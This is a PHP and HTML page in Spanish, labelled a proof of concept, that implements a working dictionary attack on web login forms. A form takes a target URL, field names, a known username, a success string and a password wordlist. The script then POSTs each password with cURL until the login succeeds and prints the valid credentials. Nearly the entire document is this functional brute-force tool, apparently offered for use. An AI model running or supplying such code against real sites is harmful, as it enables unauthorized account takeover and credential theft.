<html>
<head>
<title> Auttencation Broker </title>
</head>
<body>
<H2> Prueba de concepto - Authentication Broker - Prueba 1 </H2>
<label>* requiere activar CURL en php</label><br><br>
<table>
<FORM action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
<tr>
<td><label>URL Objetivo: </label></td>
<td><input type="text" name="link" value="http://demo1.com/validaingreso.php"></td>
</tr>
<tr>
<td><label>Nombre del Campo USUARIO del Formulario:</label></td>
<td><input type="text" name="fuser" value="username"></td>
</tr>
<tr>
<td><label>Nombre del Campo PASSWORD del Formulario: </label></td>
<td><input type="text" name="fpass" value="password"> </td>
</tr>
<!--
OPTIONAL POSTDATA: <br />
<input type="text" name="pdata"> "submit=send" "login=true"<br />
<br /> -->
<tr>
<td><label>Nombre del USUARIO conocido: </label></td>
<td><input type="text" name="username" value="DANIEL"></td>
</tr>
<tr>
<td><label>Valor de confirmacion del login: </label></td>
<td><input type="text" name="correct" value="BIENVENIDO"></td>
</tr>
<tr>
<td><label>Archivo de Contraseñas:</label></td>
<td><input type="file" name="userfile" > "c:\\contraseñas.txt"</td>
</tr>
<tr>
<td></td>
<td><input type="submit" value="ATACAR!!!!" name="submit"></td>
</tr>
</form>
</table>
<?php



function get_url_contents($url,$fuser,$username,$fpass,$password,$pdata)
{
$crl = curl_init();
$timeout = 5;
curl_setopt ($crl, CURLOPT_URL,$url);
curl_setopt ($crl, CURLOPT_FOLLOWLOCATION,true);
curl_setopt ($crl, CURLOPT_POST,true);
curl_setopt ($crl, CURLOPT_POSTFIELDS,$fuser."=".$username."&".$fpass."=".$password."&".$pdata);
curl_setopt ($crl, CURLOPT_RETURNTRANSFER, true);
curl_setopt ($crl, CURLOPT_CONNECTTIMEOUT, $timeout);
$ret = curl_exec($crl);
//echo $ret;
curl_close($crl);
return $ret;
}

if(isset($_POST['submit']))
{
	$link = $_POST["link"];
	$fuser = $_POST["fuser"];
	$fpass = $_POST["fpass"];
	//$pdata = $_POST["pdata"];
	$pdata = "";
	$username = $_POST["username"];
	$correct = $_POST["correct"];
	$userfile = $_POST["userfile"];

	echo "<br />Enlace: " . $link;
	echo "<br />Campo Usuario: " . $fuser;
	echo "<br />Campo Clave: " . $fpass;
	//echo "<br />Pdata: " . $pdata;
	echo "<br />Cadena Correcta: ". $correct;
	echo "<br />Usuario: " . $username;
	echo "<br />Archivo de clave: " . $userfile;
	echo "<br><br><br>";
	$fp = fopen($userfile,'r') or die ("Can't open wordlist-file!");
	$x = 0;
	echo "Inicio de scraping";
	while(! feof($fp))
	{
		$password = fgets($fp);
		$password = rtrim($password);
		$site = get_url_contents($link,$fuser,$username,$fpass,$password,$pdata);
		//echo $site;
		$pos = strpos($site, $correct);
		$x++;

		if($pos === FALSE)
		{
			echo "Username: " . $username . " Password: " . $password . "_no valido!!!<br />";
		}
		else
		{
			echo "EXITO: Se encontro Login Valido ";
			echo "Username: " . $username . " ";
			echo "Password: " . $password . " ";
			echo "posicion en el archivo: " . $x;
			fclose($fp);
			break;
		}

		if(feof($fp))
		{
			echo"<br />Password was not found!";
		}
	}
}

?>
<br><br>
<label>Referencias. El presente programa se realizo tomando como referencia las siguientes URL<label><br>
<label><a href="https://technwsblog.wordpress.com/2016/08/26/simple-http-login-dictionary-attack-php-code/">technwsblog</a><label><br>
<label><a href="https://www.youtube.com/watch?v=KTcNCktDQuQ">PHP curl login tutorial</a><label><br>
</body>

</html>